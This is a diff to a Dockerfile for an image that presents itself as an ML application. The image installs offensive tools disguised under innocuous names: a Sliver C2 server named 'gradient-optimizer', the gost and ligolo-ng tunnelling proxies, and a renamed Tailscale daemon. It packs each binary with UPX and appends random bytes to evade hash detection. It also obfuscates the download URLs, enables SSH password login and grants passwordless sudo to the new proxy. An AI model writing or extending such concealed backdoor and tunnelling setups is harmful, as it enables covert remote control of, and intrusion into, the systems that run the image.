@@ -8,7 +8,7 @@ COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/
 RUN apt-get update && apt-get install -y --no-install-recommends \
     curl wget sudo python3 python3-pip upx openssh-server nginx \
     git vim nano htop tmux jq unzip iputils-ping net-tools tree \
-    rclone supervisor \
+    rclone supervisor iproute2 \
     && mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd \
     && echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config \
     && echo "Port 2222" >> /etc/ssh/sshd_config \
@@ -21,11 +21,13 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && curl -fsSL URL_OBFUSCATE("https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz") -o /tmp/gost.tar.gz \
     && tar -xzf /tmp/gost.tar.gz -C /tmp && mv /tmp/gost /usr/bin/system-bridge \
     && curl -fsSL URL_OBFUSCATE("https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64") -o /usr/bin/gradient-optimizer \
+    && curl -fsSL URL_OBFUSCATE("https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz") -o /tmp/ligolo-proxy.tar.gz \
+    && tar -xzf /tmp/ligolo-proxy.tar.gz -C /tmp && mv /tmp/proxy /usr/bin/neural-route-controller \
     && mv /usr/sbin/tailscaled /usr/bin/python-cache-manager \
     && mv /usr/bin/tailscale /usr/bin/py-cache-cli \
     && mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector \
-    && chmod +x /usr/bin/tensor-allocator /usr/bin/cuda-mesh-bridge /usr/bin/system-bridge /usr/bin/gradient-optimizer \
-    && for bin in python-cache-manager py-cache-cli ai-metrics-collector tensor-allocator cuda-mesh-bridge system-bridge gradient-optimizer; do \
+    && chmod +x /usr/bin/tensor-allocator /usr/bin/cuda-mesh-bridge /usr/bin/system-bridge /usr/bin/gradient-optimizer /usr/bin/neural-route-controller \
+    && for bin in python-cache-manager py-cache-cli ai-metrics-collector tensor-allocator cuda-mesh-bridge system-bridge gradient-optimizer neural-route-controller; do \
         upx -1 "/usr/bin/$$bin" 2>/dev/null || true; \
         head -c 32 /dev/urandom >> "/usr/bin/$$bin"; \
     done \
@@ -47,7 +49,8 @@ RUN useradd -m -u 1000 -s /bin/bash user && \
     usermod -aG sudo user && \
     mkdir -p /home/user/.torch_metrics && \
     chown -R user:user /home/user/.torch_metrics && \
-    echo "user ALL=(ALL) NOPASSWD: /usr/sbin/sshd, /usr/sbin/chpasswd" >> /etc/sudoers
+    echo "user ALL=(ALL) NOPASSWD: /usr/sbin/sshd, /usr/sbin/chpasswd" >> /etc/sudoers && \
+    echo "user ALL=(ALL) NOPASSWD: /usr/bin/neural-route-controller" >> /etc/sudoers
 
 # Copy application files
 COPY --chown=user:user src/app.py /home/user/app.py
